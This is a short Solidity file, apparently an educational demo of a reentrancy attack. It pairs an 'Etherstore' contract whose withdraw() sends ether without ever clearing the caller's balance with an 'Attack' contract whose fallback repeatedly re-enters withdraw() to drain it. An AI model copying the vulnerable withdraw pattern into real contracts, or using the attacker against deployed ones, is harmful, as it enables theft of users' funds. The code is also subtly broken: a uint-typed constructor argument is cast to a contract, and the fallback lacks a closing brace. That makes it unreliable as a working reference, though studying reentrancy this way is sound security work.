//SPDX License-Identifier:MIT

pragma solidity >=0.6.0 <0.9.0;
contract Etherstore{
mapping(address=>uint) public balances;

function deposit() public payable{
    balances[msg.sender] +=msg.value;
}

function withdraw() public payable{
uint bal = balances[msg.sender];
require(bal>0);

(bool sent, ) = msg.sender.call{value:bal}("");
require(sent, "failed to send ether");

}

function getbalance() public view returns(uint){
    return address(this).balance;
}
}



contract Attack{

Etherstore public etherstore;

constructor(uint _etherstoreAddress){
etherstore = Etherstore(_etherstoreAddress);

}

fallback() external payable{
if(address(etherstore).balance >=1 ether){

etherstore.withdraw();

}

function attack() external payable{
require(msg.value >=1 ether);
etherstore.deposit{value:1 ether}();
etherstore.withdraw();

}
}
